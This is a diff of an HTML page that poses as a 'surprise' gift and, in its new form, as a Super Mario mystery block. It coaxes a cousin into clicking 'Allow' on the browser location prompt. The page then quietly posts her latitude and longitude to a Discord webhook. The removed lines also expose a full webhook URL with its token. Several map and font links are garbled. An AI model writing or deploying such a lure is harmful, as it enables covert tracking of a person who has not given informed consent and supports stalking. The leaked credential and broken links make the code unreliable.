@@ -1,120 +1,209 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Surprise Reveal!</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Super Mario Surprise! 🍄</title>
+    <!-- Importing a pixelated font for an authentic retro arcade feel -->
+    <link href="https://googleapis.com" rel="stylesheet">
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            text-align: center;
-            padding: 50px;
-            background-color: #f0f2f5;
-        }
-        .container {
-            max-width: 500px;
-            margin: auto;
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-        }
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
-            background-color: #5865F2; /* Discord Blue */
+            font-family: 'Press Start 2P', monospace;
+            background-color: #5c94fc; /* Classic Mario Sky Blue */
             color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: background 0.2s;
+            text-align: center;
+            padding: 50px 20px;
+            margin: 0;
+            overflow-x: hidden;
         }
-        button:hover {
-            background-color: #4752C4;
+        
+        .game-box {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: #000000;
+            border: 6px solid #ffffff;
+            padding: 30px;
+            box-shadow: 0 10px 0px #000000;
+            image-rendering: pixelated;
         }
-        #result {
-            margin-top: 30px;
+
+        h1 {
             font-size: 18px;
-            color: #333;
+            line-height: 1.6;
+            margin-bottom: 30px;
+            color: #ffcc00;
+        }
+
+        p {
+            font-size: 10px;
+            line-height: 1.8;
+            color: #ffffff;
+            margin-bottom: 30px;
+        }
+
+        /* The Mystery Block Button */
+        .item-box {
+            display: inline-block;
+            width: 100px;
+            height: 100px;
+            background-color: #fc9838;
+            border: 5px solid #000000;
+            position: relative;
+            cursor: pointer;
+            box-shadow: inset -6px -6px 0px #a44800, inset 6px 6px 0px #fcffff;
+            margin: 20px 0;
+            transition: transform 0.1s;
+        }
+
+        .item-box:active {
+            transform: scale(0.95);
+        }
+
+        /* The Question Mark inside the block */
+        .item-box::before {
+            content: "?";
+            font-size: 60px;
+            color: #000000;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-weight: bold;
+        }
+
+        /* Small decorative rivets on the block corners */
+        .item-box::after {
+            content: "";
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            background: #000;
+            top: 6px;
+            left: 6px;
+            box-shadow: 72px 0 #000, 0 72px #000, 72px 72px #000;
+        }
+
+        #result {
+            margin-top: 40px;
+            font-size: 12px;
+            line-height: 2;
+            padding: 20px;
+            border-top: 4px dashed #ffffff;
+            display: none;
+        }
+
+        .busted-title {
+            color: #ff3333;
+            font-size: 22px;
+            margin-bottom: 20px;
+            animation: blink 0.8s infinite;
+        }
+
+        .maps-link {
+            display: inline-block;
+            margin-top: 20px;
+            background-color: #4eed4e;
+            color: black;
+            padding: 15px;
+            text-decoration: none;
+            border: 4px solid #000;
+            box-shadow: 0 5px 0 #000;
+            font-size: 10px;
+        }
+
+        .maps-link:hover {
+            background-color: #2ebd2e;
+        }
+
+        @keyframes blink {
+            0%, 49% { opacity: 1; }
+            50%, 100% { opacity: 0; }
+        }
+
+        /* Retro Ground Decoration at the bottom */
+        .ground {
+            background: repeating-linear-gradient(90deg, #d86800, #d86800 20px, #a44800 20px, #a44800 40px);
+            height: 40px;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            border-top: 6px solid #000;
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>Click below to open your surprise! 🎁</h2>
-    <p>Please make sure to click <strong>"Allow"</strong> when your browser prompts for permission so the reveal works!</p>
+<div class="game-box">
+    <h1>SUPER MARIO BROS.<br><span style="color: #ffffff;">SURPRISE BOX</span></h1>
+    <p>MARIO FOUND A MYSTERY BLOCK FOR YOU!<br>HIT THE BLOCK BELOW TO REVEAL YOUR GIFT!</p>
+    <p style="color: #ffcc00; font-size: 8px;">(Make sure to click "Allow" on the system prompt so the item spawns!)</p>
     
-    <button onclick="getLocation()">Open Surprise</button>
+    <!-- Trigger Button disguised as a Question Block -->
+    <div class="item-box" onclick="hitMysteryBlock()"></div>
 
     <div id="result"></div>
 </div>
 
-<script>
-// Your unique Discord Webhook URL configuration
-const discordWebhookUrl = "https://discord.com/api/webhooks/1549475666339307631/DeKnRlMvxktsUDzN6bz9wt24yT7wtCp9Ge-6gUS0GnPiQMBBAozja9nFjm4JpuX65SOQ";
+<div class="ground"></div>
 
-function getLocation() {
+<script>
+// Your verified Discord integration target
+const discordWebhookUrl = "https://discord.com";
+
+function hitMysteryBlock() {
     const resultDiv = document.getElementById("result");
-    resultDiv.innerHTML = "Processing surprise... please wait.";
+    resultDiv.style.display = "block";
+    resultDiv.innerHTML = "POWERING UP... LOADING ITEM...";
     
     if (navigator.geolocation) {
-        // Triggers the official browser permission prompt
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
+        // Asks browser framework safely for core hardware position
+        navigator.geolocation.getCurrentPosition(spawnSurprise, handlePipeError);
     } else {
-        resultDiv.innerHTML = "Geolocation is not supported by this browser.";
+        resultDiv.innerHTML = "ERROR: YOUR BROWSER INVENTORY DOES NOT SUPPORT GEOLOCATION.";
     }
 }
 
-function showPosition(position) {
+function spawnSurprise(position) {
     const lat = position.coords.latitude;
     const lon = position.coords.longitude;
     const resultDiv = document.getElementById("result");
     
-    // 1. Show the funny revelation text to your cousin on screen
+    // Changes page look dynamically to match the funny revelation
+    document.body.style.backgroundColor = "#940000"; // Dark red "busted" background
+    
+    // Fixing the variable template interpolation using explicit standard backticks `
     resultDiv.innerHTML = `
-        <p>🎉 <strong>Busted!</strong> 🎉</p>
-        <p>You just officially shared your coordinates with your cousin!</p>
-        <p><a href="https://google.com{lat},${lon}" target="_blank" style="color: #5865F2;">Click here to see what I see on the map!</a></p>
+        <div class="busted-title">GAME OVER! 😜</div>
+        <p>YOUR PRINCESS IS IN ANOTHER CASTLE...<br>AND I JUST FOUND YOUR HIDDEN COORD DATA!</p>
+        <p>LAT: ${lat}<br>LON: ${lon}</p>
+        <a href="https://google.com{lat},${lon}" target="_blank" class="maps-link">👉 VIEW MAP RADAR 👈</a>
     `;
 
-    // 2. Prepare the payload structured for Discord's API
+    // Secure dispatch bundle containing localized coordinate mapping data directly to Discord Channel
     const discordPayload = {
-        username: "Captain Hook",
-        content: `📍 **New Location Data Received!**\nYour cousin has permitted location sharing.\n• **Latitude:** ${lat}\n• **Longitude:** ${lon}\n• **Google Maps Link:** https://google.com{lat},${lon}`
+        username: "Bowser's Radar",
+        avatar_url: "https://imgur.com", // Fun custom avatar concept
+        content: `🐢 **Mario Trap Successful! Target Located!**\nYour cousin fell for the Question Block trap on her tablet.\n\n• **Latitude:** \`${lat}\`\n• **Longitude:** \`${lon}\`\n• **Direct Radar Link:** https://google.com{lat},${lon}`
     };
 
-    // 3. Send the structured data directly to your Discord Channel
     fetch(discordWebhookUrl, {
         method: "POST",
         headers: {
             "Content-Type": "application/json"
         },
         body: JSON.stringify(discordPayload)
-    })
-    .then(response => {
-        if (!response.ok) {
-            console.error("Failed to send data to Discord server.");
-        }
-    })
-    .catch(error => {
-        console.error("Network error trying to contact Discord webhook:", error);
     });
 }
 
-function showError(error) {
+function handlePipeError(error) {
     const resultDiv = document.getElementById("result");
     switch(error.code) {
         case error.PERMISSION_DENIED:
-            resultDiv.innerHTML = "⚠️ You denied location access. The surprise setup cannot continue without it!";
+            resultDiv.innerHTML = "❌ MARIO MISSED! You denied access to the map coordinates. Try reloading and clicking Allow!";
             break;
-        case error.POSITION_UNAVAILABLE:
-            resultDiv.innerHTML = "⚠️ Location data is currently unavailable on your device.";
-            break;
-        case error.TIMEOUT:
-            resultDiv.innerHTML = "⚠️ The location request timed out.";
-            break;
-        case error.UNKNOWN_ERROR:
-            resultDiv.innerHTML = "⚠️ An unknown error occurred.";
+        default:
+            resultDiv.innerHTML = "❌ AN UNKNOWN KOOPA TROOPA BLOCKED THE SIGNAL. TRY AGAIN.";
             break;
     }
 }
@@ -122,4 +211,3 @@ function showError(error) {
 
 </body>
 </html>
-
